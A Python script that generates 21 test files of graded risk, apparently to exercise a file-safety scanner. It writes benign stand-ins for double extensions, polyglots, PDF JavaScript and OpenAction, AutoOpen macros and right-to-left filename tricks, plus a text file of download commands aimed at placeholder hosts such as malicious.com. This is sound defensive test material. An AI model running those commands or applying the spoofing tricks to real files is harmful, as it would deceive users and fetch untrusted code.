#!/usr/bin/env python3
"""
Create 21 test files with different risk levels:
- 7 normal/low risk files
- 7 moderate risk files  
- 7 high risk/dangerous files

These files demonstrate various security concerns like tampering, spoofing,
double extension, extension mismatch, polyglot files, etc.
"""

import os
import struct
import zipfile
import tempfile

# Create test_files directory if it doesn't exist
os.makedirs('test_files', exist_ok=True)

print("Creating 21 test files with varying risk levels...")
print("="*80)

# ============================================================================
# NORMAL/LOW RISK FILES (7 files)
# ============================================================================
print("\n1. Creating NORMAL/LOW RISK files (7)...")

# 1. Normal plain text
with open('test_files/normal_plain_text.txt', 'w') as f:
    f.write('This is a normal plain text file.\n')
    f.write('It contains no suspicious content.\n')
    f.write('Safe for analysis and processing.\n')
print("  ✓ normal_plain_text.txt - Clean text file")

# 2. Normal DOCX
with zipfile.ZipFile('test_files/normal_document.docx', 'w', zipfile.ZIP_DEFLATED) as zf:
    content_types = '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''
    zf.writestr('[Content_Types].xml', content_types)
    document = '''<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p><w:r><w:t>Normal Business Document</w:t></w:r></w:p>
        <w:p><w:r><w:t>This document contains standard business content.</w:t></w:r></w:p>
    </w:body>
</w:document>'''
    zf.writestr('word/document.xml', document)
print("  ✓ normal_document.docx - Clean OOXML document")

# 3. Normal PDF
with open('test_files/normal_report.pdf', 'wb') as f:
    pdf_content = b'''%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 50 >>
stream
BT
/F1 12 Tf
100 700 Td
(Normal Report) Tj
ET
endstream
endobj
xref
0 5
trailer
<< /Size 5 /Root 1 0 R >>
startxref
250
%%EOF
'''
    f.write(pdf_content)
print("  ✓ normal_report.pdf - Clean PDF document")

# 4. Normal JPEG image
with open('test_files/normal_photo.jpg', 'wb') as f:
    f.write(b'\xFF\xD8')  # SOI
    f.write(b'\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')
    f.write(b'\xFF\xC0\x00\x11\x08\x00\xC8\x00\xC8\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01')
    f.write(b'\x00' * 200)
    f.write(b'\xFF\xD9')  # EOI
print("  ✓ normal_photo.jpg - Clean JPEG image")

# 5. Normal ZIP archive
with zipfile.ZipFile('test_files/normal_archive.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('readme.txt', 'This is a normal archive.\nContains documentation files.')
    zf.writestr('data.csv', 'Name,Age\nJohn,30\nJane,25')
print("  ✓ normal_archive.zip - Clean ZIP archive")

# 6. Normal CSV
with open('test_files/normal_data.csv', 'w') as f:
    f.write('ID,Name,Value\n')
    f.write('1,Item A,100\n')
    f.write('2,Item B,200\n')
    f.write('3,Item C,150\n')
print("  ✓ normal_data.csv - Clean CSV data file")

# 7. Normal JSON
with open('test_files/normal_config.json', 'w') as f:
    f.write('{\n')
    f.write('  "application": "Test App",\n')
    f.write('  "version": "1.0.0",\n')
    f.write('  "settings": {\n')
    f.write('    "debug": false,\n')
    f.write('    "timeout": 30\n')
    f.write('  }\n')
    f.write('}\n')
print("  ✓ normal_config.json - Clean JSON config")

# ============================================================================
# MODERATE RISK FILES (7 files)
# ============================================================================
print("\n2. Creating MODERATE RISK files (7)...")

# 8. Extension mismatch - JPEG with .txt extension
with open('test_files/mismatch_image.txt', 'wb') as f:
    f.write(b'\xFF\xD8')  # JPEG SOI
    f.write(b'\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')
    f.write(b'\xFF\xC0\x00\x11\x08\x00\x64\x00\x64\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01')
    f.write(b'\x00' * 100)
    f.write(b'\xFF\xD9')
print("  ✓ mismatch_image.txt - Extension mismatch (JPEG as .txt)")

# 9. ZIP with trailing data
with zipfile.ZipFile('test_files/trailing_data_archive.zip', 'w') as zf:
    zf.writestr('file.txt', 'Normal content')
with open('test_files/trailing_data_archive.zip', 'ab') as f:
    f.write(b'\x00' * 50)
    f.write(b'HIDDEN_DATA_AFTER_ZIP' * 10)
print("  ✓ trailing_data_archive.zip - ZIP with trailing data")

# 10. PDF with embedded URLs
with open('test_files/pdf_with_urls.pdf', 'wb') as f:
    pdf_content = b'''%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 100 >>
stream
BT
/F1 10 Tf
50 700 Td
(Visit: http://example.com/download) Tj
50 680 Td
(Or: https://suspicious-site.org) Tj
ET
endstream
endobj
xref
0 5
trailer
<< /Size 5 /Root 1 0 R >>
startxref
350
%%EOF
'''
    f.write(pdf_content)
print("  ✓ pdf_with_urls.pdf - PDF with embedded URLs")

# 11. Text file with suspicious strings
with open('test_files/suspicious_script.txt', 'w') as f:
    f.write('Script for automation\n')
    f.write('cmd.exe /c dir\n')
    f.write('powershell -ExecutionPolicy Bypass\n')
    f.write('wget http://download-site.com/tool.exe\n')
    f.write('curl -O http://malicious.com/payload\n')
print("  ✓ suspicious_script.txt - Text with suspicious commands")

# 12. DOCX with custom XML
with zipfile.ZipFile('test_files/docx_custom_xml.docx', 'w', zipfile.ZIP_DEFLATED) as zf:
    content_types = '''<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''
    zf.writestr('[Content_Types].xml', content_types)
    zf.writestr('word/document.xml', '<doc/>')
    zf.writestr('customXml/item1.xml', '<custom>Data here</custom>')
    zf.writestr('customXml/item2.xml', '<more>Custom data</more>')
print("  ✓ docx_custom_xml.docx - DOCX with custom XML parts")

# 13. PDF with multiple incremental updates
with open('test_files/pdf_incremental.pdf', 'wb') as f:
    pdf_content = b'''%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
trailer
<< /Size 4 /Root 1 0 R >>
startxref
150
%%EOF
%% Update 1
4 0 obj
<< /Data (Update1) >>
endobj
xref
4 1
trailer
<< /Size 5 /Root 1 0 R /Prev 150 >>
startxref
250
%%EOF
%% Update 2
5 0 obj
<< /Data (Update2) >>
endobj
xref
5 1
trailer
<< /Size 6 /Root 1 0 R /Prev 250 >>
startxref
350
%%EOF
'''
    f.write(pdf_content)
print("  ✓ pdf_incremental.pdf - PDF with multiple updates (tampering indicator)")

# 14. Archive with nested archive
with zipfile.ZipFile('test_files/nested_archive.zip', 'w') as zf:
    # Create inner ZIP
    inner_zip = b'PK\x03\x04\x0a\x00\x00\x00\x00\x00' + b'\x00' * 50
    zf.writestr('data.txt', 'Normal text content')
    zf.writestr('inner.zip', inner_zip)
    zf.writestr('another.7z', b'7z\xBC\xAF\x27\x1C' + b'\x00' * 20)
print("  ✓ nested_archive.zip - Archive with nested archives")

# ============================================================================
# HIGH RISK/DANGEROUS FILES (7 files)
# ============================================================================
print("\n3. Creating HIGH RISK/DANGEROUS files (7)...")

# 15. Double extension file
with open('test_files/document.pdf.exe', 'wb') as f:
    f.write(b'MZ')  # PE header start
    f.write(b'\x00' * 100)
    f.write(b'This PE-like file has double extension')
print("  ✓ document.pdf.exe - Double extension (spoofing)")

# 16. Polyglot ZIP+PDF
with zipfile.ZipFile('test_files/polyglot.zip', 'w') as zf:
    zf.writestr('file.txt', 'This is both ZIP and PDF')
# Append PDF signature at offset
with open('test_files/polyglot.zip', 'ab') as f:
    f.write(b'\x00' * 100)
    f.write(b'%PDF-1.4\n')
    f.write(b'1 0 obj\n<< /Type /Catalog >>\nendobj\n')
    f.write(b'%%EOF\n')
print("  ✓ polyglot.zip - Polyglot file (ZIP+PDF)")

# 17. PDF with JavaScript
with open('test_files/pdf_with_javascript.pdf', 'wb') as f:
    pdf_content = b'''%PDF-1.7
1 0 obj
<< /Type /Catalog /JavaScript << /JS (app.alert("Malicious");) >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
trailer
<< /Size 4 /Root 1 0 R >>
startxref
200
%%EOF
'''
    f.write(pdf_content)
print("  ✓ pdf_with_javascript.pdf - PDF with JavaScript (code execution risk)")

# 18. PDF with auto-action
with open('test_files/pdf_auto_action.pdf', 'wb') as f:
    pdf_content = b'''%PDF-1.7
1 0 obj
<< /Type /Catalog /OpenAction << /S /JavaScript /JS (malicious_code();) >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
trailer
<< /Size 4 /Root 1 0 R >>
startxref
200
%%EOF
'''
    f.write(pdf_content)
print("  ✓ pdf_auto_action.pdf - PDF with OpenAction (auto-execution)")

# 19. High entropy file (packed/encrypted)
import random
random.seed(42)
with open('test_files/high_entropy_data.bin', 'wb') as f:
    f.write(bytes([random.randint(0, 255) for _ in range(4096)]))
print("  ✓ high_entropy_data.bin - High entropy (encryption/packing indicator)")

# 20. DOCX with VBA macros
with zipfile.ZipFile('test_files/docx_with_macros.docx', 'w', zipfile.ZIP_DEFLATED) as zf:
    content_types = '''<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''
    zf.writestr('[Content_Types].xml', content_types)
    zf.writestr('word/document.xml', '<doc/>')
    # VBA project indicator
    vba_content = b'Attribute VB_Name = "Module1"\r\nSub AutoOpen()\r\n  MsgBox "Macro"\r\nEnd Sub\r\n'
    zf.writestr('word/vbaProject.bin', vba_content)
print("  ✓ docx_with_macros.docx - DOCX with VBA macros (auto-exec risk)")

# 21. Unicode deception filename (RLO character)
# Note: Using regular name but content that would be detected
with open('test_files/unicode_deception.txt', 'w', encoding='utf-8') as f:
    # Include RLO character in content to demonstrate detection
    f.write('This file demonstrates Unicode deception.\n')
    f.write('Filename could be: invoice\u202Eexe.pdf (appears as invoice.pdf backwards)\n')
    f.write('The RLO character (U+202E) reverses text display.\n')
print("  ✓ unicode_deception.txt - Unicode deception example")

# ============================================================================
# Summary
# ============================================================================
print("\n" + "="*80)
print("SUMMARY: Created 21 test files")
print("="*80)
print("\nNORMAL/LOW RISK (7 files):")
print("  1. normal_plain_text.txt")
print("  2. normal_document.docx")
print("  3. normal_report.pdf")
print("  4. normal_photo.jpg")
print("  5. normal_archive.zip")
print("  6. normal_data.csv")
print("  7. normal_config.json")

print("\nMODERATE RISK (7 files):")
print("  8. mismatch_image.txt (extension mismatch)")
print("  9. trailing_data_archive.zip (trailing data)")
print(" 10. pdf_with_urls.pdf (embedded URLs)")
print(" 11. suspicious_script.txt (suspicious commands)")
print(" 12. docx_custom_xml.docx (custom XML)")
print(" 13. pdf_incremental.pdf (tampering indicator)")
print(" 14. nested_archive.zip (nested archives)")

print("\nHIGH RISK/DANGEROUS (7 files):")
print(" 15. document.pdf.exe (double extension)")
print(" 16. polyglot.zip (polyglot ZIP+PDF)")
print(" 17. pdf_with_javascript.pdf (JavaScript execution)")
print(" 18. pdf_auto_action.pdf (auto-action/launch)")
print(" 19. high_entropy_data.bin (encryption/packing)")
print(" 20. docx_with_macros.docx (VBA macros)")
print(" 21. unicode_deception.txt (Unicode deception)")

print("\n✅ All test files created successfully!")
print("\nThese files cover:")
print("  • Extension mismatch and double extension")
print("  • Polyglot files")
print("  • Trailing data and tampering")
print("  • JavaScript and auto-execution")
print("  • Macros and VBA")
print("  • High entropy (packing/encryption)")
print("  • Suspicious strings and URLs")
print("  • Unicode deception")
print("  • Nested archives")
